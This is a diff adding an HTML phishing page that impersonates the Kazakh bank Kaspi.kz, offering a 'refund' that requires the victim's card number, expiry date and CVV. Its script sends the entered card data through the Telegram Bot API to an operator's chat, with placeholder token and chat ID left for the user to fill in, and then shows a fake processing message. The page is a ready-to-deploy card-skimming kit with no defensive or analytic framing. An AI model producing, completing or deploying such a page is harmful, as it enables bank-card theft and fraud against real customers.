@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Возврат средств | Kaspi</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      background-color: #ed1c24;
+      color: white;
+      padding: 20px;
+      text-align: center;
+      font-size: 22px;
+    }
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background: white;
+      padding: 30px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      border-radius: 10px;
+    }
+    .input-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #ed1c24;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .message {
+      text-align: center;
+      margin-top: 20px;
+      color: green;
+      display: none;
+    }
+    .card-image {
+      display: block;
+      margin: 0 auto 20px auto;
+      max-width: 300px;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">Возврат средств — Kaspi.kz</div>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Kaspi_logo.svg" class="card-image" alt="Kaspi Logo">
+    <div class="input-group">
+      <label>Номер карты</label>
+      <input type="text" id="card_number" placeholder="0000 0000 0000 0000">
+    </div>
+    <div class="input-group">
+      <label>Срок действия</label>
+      <input type="text" id="card_expiry" placeholder="MM/YY">
+    </div>
+    <div class="input-group">
+      <label>CVV</label>
+      <input type="text" id="card_cvv" placeholder="123">
+    </div>
+    <button onclick="sendData()">Отправить</button>
+    <div class="message" id="message">Ваш запрос обрабатывается. Вы получите уведомление в течение трёх рабочих дней.</div>
+  </div>
+
+  <script>
+    function sendData() {
+      const number = document.getElementById('card_number').value;
+      const expiry = document.getElementById('card_expiry').value;
+      const cvv = document.getElementById('card_cvv').value;
+
+      const token = 'YOUR_BOT_TOKEN'; // ЗАМЕНИ
+      const chat_id = 'YOUR_CHAT_ID'; // ЗАМЕНИ
+      const msg = `💳 Заявка на возврат Kaspi:\n\nНомер карты: ${number}\nСрок: ${expiry}\nCVV: ${cvv}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: msg
+        })
+      })
+      .then(() => {
+        document.getElementById('message').style.display = 'block';
+      })
+      .catch(err => alert("Ошибка отправки!"));
+    }
+  </script>
+</body>
+</html>
